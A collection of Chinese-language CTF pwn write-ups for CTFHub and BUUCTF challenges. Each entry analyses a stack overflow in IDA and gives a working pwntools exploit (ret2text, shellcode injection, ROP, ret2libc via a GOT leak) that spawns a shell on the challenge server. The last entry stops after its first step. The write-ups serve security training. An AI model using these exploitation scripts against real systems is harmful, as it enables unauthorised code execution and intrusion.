# Pwn

## CTFHub

### ret2text

先`file ./ret2text`查看文件类型再`checksec --file=./ret2text`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/1.png)

用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v4`中，`v4`的长度只有`0x70`，即可用栈大小只有`112`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/2.png)

双击`v4`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x70`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/3.png)

在`Function Window`中注意到有一个名为`secure()`的函数，函数中当`scanf()`输入的`v2`变量和`rand()`函数生成的`v3`变量值相等时，会发生系统调用，因此构造`payload`时需要再加上`system('/bin/sh')`函数的地址即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/4.png)

编写`Python`代码即可得到`ctfhub{f878895b3600b2e2192e5c9a}`。

```python
from pwn import *

io = remote('challenge-e20ddfc12b209019.sandbox.ctfhub.com', 34749)
payload = b'a'*0x70 + b'fuckpwn!' + p64(0x4007B8)
io.sendlineafter('Welcome to CTFHub ret2text.Input someting:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/5.png)

提交`ctfhub{f878895b3600b2e2192e5c9a}`即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/6.png)

------

### ret2shellcode

先`file ./ret2shellcode`查看文件类型再`checksec --file=./ret2shellcode`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/1.png)

用`IDA Pro 64bit`打开附件`ret2shellcode`，按`F5`反汇编源码并查看主函数，发现`buf`变量的地址被`printf()`函数输出了，然后`read()`函数读取输入到变量`buf`中，`char`型变量`buf`的长度只有`0x10`，即可用栈大小只有`10`字节，但是`read()`函数限制输入`0x400`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/2.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x10`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/3.png)

由于`checksec`时发现`NX disabled`，即程序没有开`NX`保护，栈的数据段可以执行。虽然程序中并没有`system()`函数和`/bin/sh`，但是`buf`变量的栈地址被`printf()`函数泄露出来了，因此可以尝试让程序跳转到我们构造的`shellcode`中，并在栈溢出后返回到栈的数据段上执行，就能得到`shell`权限了。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# io = process('ret2shellcode')
io = remote('challenge-90f37d9c89a2800a.sandbox.ctfhub.com', 33884)
io.recvuntil(b'[')
buf_address = int(io.recvuntil(b']')[:-1].decode('utf-8'), 16)
log.success('buf_address => %s' % hex(buf_address).upper())
shellcode_address = buf_address+0x20 # buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8
log.success('buf_address => %s' % hex(shellcode_address).upper())
shellcode = asm(shellcraft.sh())
payload = b'a'*0x10 + b'fuckpwn!' + p64(shellcode_address) + shellcode
io.recv()
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/4.png)

`ls`可以看到有个`flag`文件，`cat flag`拿到`ctfhub{f878895b3600b2e2192e5c9a}`提交即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/5.png)

------

## BUUCTF

### [test_your_nc](https://buuoj.cn/challenges#test_your_nc)

这题亏我还先`file ./test`查看文件类型再`checksec --file=test`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/test_your_nc/1.png)

结果输入以下代码就能拿到`flag{24c4fb91-44b7-4a4f-8f30-895875efacd7}`。

```bash
nc node4.buuoj.cn 27841 #使用nc连接node4.buuoj.cn的监听端口27841
ls #这步可以看到当前目录下有个flag文件
cat flag #直接输出flag即可
```

------

### [others_shellcode](https://buuoj.cn/challenges#others_shellcode)

先`file ./other_shellcode`查看文件类型再`checksec --file=./other_shellcode`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/1.png)

在本地尝试运行一下这个程序，好家伙发现这直接执行了`shell`，尝试输入`cat flag`就拿到本地生成的`flag`啦。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/2.png)

用`IDA Pro 32bit`打开附件`shell_asm`后按`F5`反汇编源码并查看主函数，发现有个`getShell()`函数很可疑。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/3.png)

双击`getShell()`函数查看详情，发现程序将字符串`/bin//sh`赋值给了`char`型数组`v1`，并把`int`型变量`result`赋值为`11`，但是这都不是重点，重点是`__asm {int 80h}`这行代码，它在`C`语言里嵌入了汇编语言，并且用`int 80h`进行系统调用`shell`。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/4.png)

编写`Python`代码连接`node4.buuoj.cn`的监听端口`28021`，发送`cat flag`即可得到`flag{12aab39b-9d20-4f50-a9a8-b52320ed3771}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 28021)
io.sendline(b'cat flag')
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/5.png)

------

### [rip](https://buuoj.cn/challenges#rip)

先`file ./pwn1`查看文件类型再`checksec --file=pwn1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/rip/1.png)

用`IDA Pro 64bit`打开`pwn1`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`s`中，`s`的长度只有`0xf`，即可用栈大小只有`15`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/rip/2.png)

在`Functions window`可以看到有一个`fun()`函数：

![](https://paper.tanyaodan.com/BUUCTF/rip/3.png)

按`F5`反汇编可以看到这是一个系统调用，且`fun()`函数的起始地址为`0x401186`。

![](https://paper.tanyaodan.com/BUUCTF/rip/4.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`28531`，并发送`payload`：

```python
from pwn import *
# remote()建立远程连接,指明ip和port
io = remote('node4.buuoj.cn', 28531)
payload = b'a'*(0xf + 0x8) + p64(0x40118A)
io.sendline(payload) #发送数据
io.interactive() #与shell进行交互
```

与`shell`交互时输入以下命令行即可得到`flag{c706d420-68bf-4b75-9468-97997d4817b6}`。

```bash
ls #这步可以看到当前目录下有个flag文件
cat flag #直接输出flag即可
```

![](https://paper.tanyaodan.com/BUUCTF/rip/5.png)

------

### [warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)

先`file ./warmup_csaw_2016`查看文件类型再`checksec --file=warmup_csaw_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/1.png)

用`IDA Pro 64bit`打开`warmup_csaw_2016`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v5`中，`v5`的长度只有`0x40`，即可用栈大小只有`64`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/2.png)

在`Functions window`可以看到有一个`sub_40060D()`函数，按`F5`反汇编可以看到这是一个系统调用，且`sub_40060D()`函数的起始地址为`0x40060D`。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/3.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25282`，发送`payload`即可得到`flag{31eb59d1-1c21-4440-96a5-b12276f75a41}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25282)
payload = b'a'*(0x40 + 0x8) + p64(0x40060D)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/4.png)

------

### [ciscn_2019_n_1](https://buuoj.cn/challenges#ciscn_2019_n_1)

先`file ./ciscn_2019_n_1`查看文件类型再`checksec --file=ciscn_2019_n_1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/1.png)

用`IDA Pro 64bit`打开`ciscn_2019_n_1`后按`F5`反汇编源码并查看主函数，发现`fun()`函数最可疑。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/2.png)

双击`func()`函数查看源码可以看到当`v2 = 11.28125`时会有一个系统调用。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/3.png)

查看汇编代码双击`cs:dword_4007F4`可以看到`11.28125`在内存中的`16`进制表示为`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/4.png)

查看栈结构，此处`var_30`是`v1`，而`var_4`是`v2`，需要`(0x30-0x04)=44`个字节就能让栈溢出，最后再填入`11.28125`对应的十六进制数`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/5.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25860`，发送`payload`即可得到`flag{42086316-01d7-47ee-bfaa-00861bbe8222}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25860)
payload = b'a'*(0x30 - 0x4) + p64(0x41348000)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/6.png)

------

### [ciscn_2019_n_8](https://buuoj.cn/challenges#ciscn_2019_n_8)

先`file ./ciscn_2019_n_8`查看文件类型再`checksec --file=./ciscn_2019_n_8`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_8/1.png)

用`IDA Pro 32bit`打开`ciscn_2019_n_8`后按`F5`反汇编，可以看到主函数源码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL )  //当var[13]的值等于0x11即17就能系统调用/bin/sh
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

构造`payload`时直接通过数组赋值用`13*4`个字节占满`var[0]`至`var[12]`，再把`var[13]`赋值为`0x11`，即可系统调用`/bin/sh`。

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`29508`，发送`payload`即可得到`flag{f02dd738-d5ec-4e09-9b7f-68cf73aae00c}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29508)
payload = b'a'*13*4 + p32(0x11)
io.sendlineafter(b'What\'s your name?\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_8/2.png)

------

### [pwn1_sctf_2016](https://buuoj.cn/challenges#pwn1_sctf_2016)

先`file ./pwn1_sctf_2016`查看文件类型再`checksec --file=pwn1_sctf_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/1.png)

用`IDA Pro 32bit`打开`pwn1_sctf_2016`后按`F5`反汇编源码并查看主函数，发现`vuln()`函数。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/2.png)

双击`vuln()`函数查看源码，分析后发现`fgets()`函数限制输入`32`个字节到变量`s`中，乍一看并没有超出可用栈大小。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/3.png)

再按一次`F5`后发现第`19`行的`replace()`函数会把输入的`I`替换成`you`，`1`个字符变成`3`个字符，并且在第`27`行会对原来的`s`变量重新赋值。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/4.png)

在`Functions window`可以看到有一个`get_flag()`函数，按`F5`反汇编可以看到这是一个系统调用，且`get_flag()`函数的起始地址为`0x8048F0D`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/5.png)

查看栈结构发现`s`的长度为`0x3c`，即`60`个字节，而输入被限制在`32`个字节内，每个`I`可以被替换成`you`，所以输入`60÷3=20`个`I`就能让栈溢出，然后`db 4 dup(?)` 还需要占用`4`个字节的内存，最后加上`get_flag()`函数的起始地址`0x8048F0D`构成`payload`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/6.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`26333`，发送`payload`即可得到`flag{efb5872f-b8d0-4892-9ed3-ea71e8a7a983}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 26333)
e = ELF('pwn1_sctf_2016')
address = e.symbols['get_flag']
log.success('get_flag_address => %s' % hex(address).upper())
payload = b'I'*20 + b'a'*0x4 + p32(address)
# payload = b'I'*20 + b'a'*0x4 + p32(0x8048F0D)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/7.png)

------

### [jarvisoj_level0](https://buuoj.cn/challenges#jarvisoj_level0)

先`file ./level0`查看文件类型再`checksec --file=level0`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/1.png)

用`IDA Pro 64bit`打开`level0`后按`F5`反汇编源码并查看主函数，发现问题的关键在于`vulnerable_function()`函数。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/2.png)

双击`vulnerable_function()`函数可以看到`buf`的长度只有`0x80`，即可用栈大小只有`108`字节，但是`read()`并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/3.png)

在`Functions window`可以看到有一个`callsystem()`函数，按`F5`反汇编可以看到这是一个系统调用，且`callsystem()`函数的起始地址为`0x400596`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/4.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25719`，`buf`需覆盖`0x80`个字节覆盖，再加上`rbp`的`0x8`个字节，最后加上`callsystem()`函数的起始地址`0x400596`构成`payload`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25719)
e = ELF('level0')
address = e.symbols['callsystem']
log.success('callsystem_address => {}'.format(hex(address).upper()))
payload = b'a'*(0x80 + 0x8) + p64(address)
# payload = b'a'*(0x80 + 0x8) + p64(0x400596)
io.sendline(payload)
io.interactive()
```

发送`payload`监听成功后`ls`查看文件目录再`cat flag`即可得到`flag{af006b52-6eb0-4df4-9706-dcbb4dc8cff2}`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/5.png)

------

### [[HarekazeCTF2019]baby_rop](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)

先`file ./HarekazeCTF2019_babyrop1`查看文件类型再`checksec --file=./HarekazeCTF2019_babyrop1`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/1.png) 

用`IDA Pro 64bit`打开附件`HarekazeCTF2019_babyrop1`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`v4`，`v4`的可用栈大小为`0x10`，`scanf()`函数读取输入到`v4`变量时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/2.png)

双击`v4`变量查看其在当前函数栈帧的详情，构造`payload`时可以用`0x10`个字节占满变量`v4`，再用`0x8`个字节覆盖到栈帧。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/3.png)

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`的地址。

```bash
ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/4.png)

在`Function window`中存在`system()`函数的地址，我们也可以通过`ELF`模块的`symbols['system']`来获取`system()`函数的地址。字符串`/bin/sh`的地址可以通过`ROPgadget`获取。

```bash
ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/5.png)

构造`payload`时向`pop_rdi`寄存器中传入字符串`/bin/sh`的地址，再调用`system`即可完成系统调用，编写`Python`代码打通靶机获取到目标主机的`shell`后输入`cat /home/babyrop/flag`即可得到`flag{5113e012-2d92-4257-bf3a-f688df2841bf}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28730)
e = ELF('./HarekazeCTF2019_babyrop1')
# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
pop_rdi = 0x400683
system_address = e.symbols['system'] # 0x400490
# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
bin_sh_address = 0x601048
payload = b'a'*0x10 + b'fuckpwn!'
payload += flat(pop_rdi, bin_sh_address, system_address)
io.sendlineafter(b'What\'s your name? ', payload)
io.interactive()  # cat /home/babyrop flag
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/6.png)

------

### [jarvisoj_tell_me_something](https://buuoj.cn/challenges#jarvisoj_tell_me_something)

先`file ./jarvisoj_tell_me_something`查看文件类型再`checksec --file=./jarvisoj_tell_me_something`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/1.png)

用`IDA Pro 64bit`打开附件`jarvisoj_tell_me_something`，按`F5`反汇编源码并查看主函数，可以看到有个`int`型变量`v4`，`v4`的可用栈大小为`0x88`，`read()`函数读取输入到`v4`变量时限制的字节数为`0x100`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/2.png)

在`Function window`中存在后门函数`good_game()`，这个函数读取了服务器中的`flag.txt`文件并进行输出。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/3.png)

构造`payload`时只要我们用`0x88`个字节覆盖掉`v4`变量，造成栈溢出漏洞，再将函数栈帧的返回地址覆盖成后门函数`good_game()`的地址就能拿到`flag`啦。编写`Python`代码即可得到`flag{5325d99b-666c-48e3-bd0c-be4fdd6619d4}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29608)
e = ELF('./jarvisoj_tell_me_something')
good_game = e.symbols['good_game']
payload = b'a'*0x88 + p64(good_game)
io.sendlineafter(b'Input your message:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/4.png)

------

### [护网杯_2018_gettingstart](https://buuoj.cn/challenges#%E6%8A%A4%E7%BD%91%E6%9D%AF_2018_gettingstart)

先`file ./2018_gettingstart`查看文件类型再`checksec --file=2018_gettingstart`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/1.png)

用`IDA Pro 64bit`打开附件`2018_gettingstart`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`buf`，`buf`的可用栈大小为`0x30`，`read()`函数读取输入到`buf`变量时限制的字节数为`0x28`，并不能构成栈溢出。

注意到当`v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1`这个条件成立时就会发生系统调用`system('/bin/sh')`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/2.png)

分别双击`v5`和`v6`可以看到其在栈中的位置，构造`payload`时只需要将`v5`和`v6`重新赋值即可让主函数中的`if`条件成立。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/3.png)

`v5`的赋值直接就是`0x7FFFFFFFFFFFFFFF`，那么`v6 == 0.1`该怎么样用`16`进制数表示呢？可以在这个网站https://www.binaryconvert.com/result_double.html查看`0.1`用`IEEE754`双精度浮点数中的二进制格式。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/4.png)

当然也能在汇编源码中看到`ucomisd xmm0, cs:qword_C10`，双击`qword_C10`就能知道`0.1`在内存中的数值`0x3FB999999999999A`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/5.png)

编写`Python`代码即可得到`flag{5113e012-2d92-4257-bf3a-f688df2841bf}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27036)
# io = process('./2018_gettingStart')
payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
io.sendlineafter(b'But Whether it starts depends on you.\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/6.png)

------

### [bjdctf_2020_babystack](https://buuoj.cn/challenges#bjdctf_2020_babystack)

先`file ./bjdctf_2020_babystack`查看文件类型再`checksec --file=bjdctf_2020_babystack`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/1.png)

用`IDA Pro 64bit`打开附件`bjdctf_2020_babystack`，按`F5`反汇编源码并查看主函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x10`，`read()`函数虽然限制了输入到`buf`变量的字节数但是该字节数是由用户输入的`nbytes`变量决定的，当`nbytes`变量是一个足够大的数值时，显然会造成栈溢出。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/2.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x10`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/3.png)

在`Function Window`中注意到有一个名为`backdoor()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`backdoor()`函数的起始地址即可。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/4.png)

编写`Python`代码即可得到`flag{0e0d405b-c936-45c4-afc4-947afc46b0a3}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('./bjdctf_2020_babystack')
io = remote('node4.buuoj.cn', 29417)
e = ELF('./bjdctf_2020_babystack')
io.sendlineafter(b'Please input the length of your name:', b'100')
backdoor_address = e.symbols['backdoor'] # 0x4006E6
log.success('backdoor_address => %s' % hex(backdoor_address))
payload = b'a'*0x10 + b'fuckpwn!' + p64(backdoor_address)
io.sendlineafter(b'What\'s u name?', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/5.png)

------

### [bjdctf_2020_babyrop](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

先`file ./bjdctf_2020_babyrop`查看文件类型再`checksec --file=bjdctf_2020_babyrop`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/1.png)

用`IDA Pro 64bit`打开附件`bjdctf_2020_babyrop`，按`F5`反汇编源码并查看主函数，发现`vuln()`函数很可疑。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/2.png)

双击发现`vuln()`函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x20`，`read()`函数限制输入到`buf`变量的字节数为`0x64`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/3.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x20`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/4.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```python
ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/5.png)

编写`Python`代码即可得到`flag{aed7af27-c195-4e84-824f-263dc8fb04df}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28823)
e = ELF('bjdctf_2020_babyrop')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
pop_rdi = 0x400733 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts_address = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.23-0ubuntu11_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c9 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/6.png)

------

------

### [铁人三项(第五赛区)_2018_rop](https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop)

先`file ./2018_rop`查看文件类型再`checksec --file=2018_rop`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/1.png)

用`IDA Pro 32bit`打开附件`2018_rop`，按`F5`反汇编源码并查看主函数，双击`be_nice_to_people()`函数查看详情并没有发现什么，

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/2.png)

双击`vulnerable_function()`函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x88`，`read()`函数限制了输入到`buf`变量的字节数为`0x100`，显然存在栈溢出漏洞。构造`payload`时先用`0x88`个字节占满`buf`变量，再加上`4`个字节覆盖到返回地址。

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/3.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并通过`write()`函数泄露`write()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`write()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

其中`write()`函数原型如下：

```c
ssize_t write(int fd, const void*buf, size_t count);
// write()会把参数buf所指的内存写入count个字节到参数fd所指的文件内。
// fd:是文件描述符（write所对应的是写，即就是1）
// buf:通常是一个字符串，需要写入的字符串
// count：是每次写入的字节数
```

编写`Python`代码即可得到`flag{f3efd9be-b4a5-4fd3-9446-49c300eaf93c}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29081)
e = ELF('./2018_rop')
write_plt = e.plt['write']
log.success('write_plt => %s' % hex(write_plt))
write_got = e.got['write']
log.success('write_got => %s' % hex(write_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
payload = b'a'*0x88 + b'fuck' + p32(write_plt) + p32(main_address) # 栈溢出，返回地址填写write()函数在plt表中的地址，并加上main()函数地址以再次执行程序
payload += p32(0) + p32(write_got) + p32(4) # write()函数的参数
io.sendline(payload)
write_address = u32(io.recv(4))
log.success('write_address => %s' % hex(write_address))
libc = LibcSearcher('write', write_address) # 获取libc版本, libc6-i386_2.27-3ubuntu1_amd64
libcbase = write_address - libc.dump('write')
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system')
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s' % hex(bin_sh_address))
payload = b'a'*0x88 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/4.png)

------

### [[OGeek2019]babyrop](https://buuoj.cn/challenges#[OGeek2019]babyrop)

先`file ./babyrop`查看文件类型再`checksec --file=./babyrop`检查一下文件保护情况。

